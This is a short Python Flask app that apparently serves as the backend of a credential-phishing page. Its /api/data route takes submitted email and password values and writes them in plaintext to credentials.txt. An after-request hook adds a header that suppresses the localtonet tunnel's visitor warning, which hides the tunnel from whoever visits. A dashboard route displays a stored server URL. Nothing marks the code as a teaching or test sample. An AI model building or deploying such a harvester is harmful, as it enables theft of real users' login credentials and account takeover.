from flask import Flask,render_template,request,jsonify,Response

app=Flask(__name__)

# Add the localtonet-skip-warning header to all responses
@app.after_request
def add_localtonet_skip_warning(response):
    response.headers['localtonet-skip-warning'] = 'true'
    return response

@app.route("/")
def  home():
    return render_template("index.html")

@app.route("/api/data",methods=["POST"])
def recieve_data():
    data = request.get_json()
    email = data.get('email')
    password=data.get('password')
    with open('credentials.txt','w') as f:
      f.write(f'Email Received : {email}  \n  Password Received : {password}')
    return jsonify({"message": "Data received"})

@app.route('/dashboard')
def dashboard():
  with open('server_url.txt','r') as f:
    content=f.read()
  return render_template('dashboard.html',server_url=content)
if __name__ == "__main__":
    app.run(port=5000)